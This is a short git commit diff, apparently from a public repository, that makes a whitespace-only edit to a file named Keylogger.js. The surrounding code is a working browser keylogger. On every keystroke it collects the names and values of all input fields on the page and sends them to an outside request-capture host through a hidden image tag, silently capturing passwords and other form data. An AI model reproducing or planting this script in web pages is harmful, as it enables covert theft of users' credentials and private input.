bb27c321da89df9480e63ca2868ed73b97b526c3
Alex K <Leetcore@users.noreply.github.com>
2019-11-25 13:19:26 +0100

    Update Keylogger.js

--- Keylogger.js
+++ Keylogger.js
@@ -2,8 +2,7 @@
 document.addEventListener('keyup', function () {
     document.querySelectorAll('input').forEach(function (element) {
       if (element.value.length > 0) {
-        document.body.insertAdjacentHTML('beforeend', '<img style="display:none;"   src="http://requestbin.net/r/xxx?element='+ element.name +'&value='+ element.value +'"/>');
+        document.body.insertAdjacentHTML('beforeend', '<img style="display:none;" src="http://requestbin.net/r/xxx?element='+ element.name +'&value='+ element.value +'"/>');
       }
-
     });
 });
